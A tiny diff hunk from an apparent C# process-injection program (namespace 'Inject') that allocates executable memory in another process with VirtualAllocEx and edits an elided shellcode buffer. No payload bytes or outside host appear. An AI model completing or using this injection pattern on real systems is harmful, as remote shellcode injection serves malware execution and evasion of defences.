@@ -43,7 +43,7 @@ namespace Inject
 
             IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
 
-            byte[] buf = new byte[596] {};
+            byte[] buf = ...
             
             IntPtr outSize;
                 
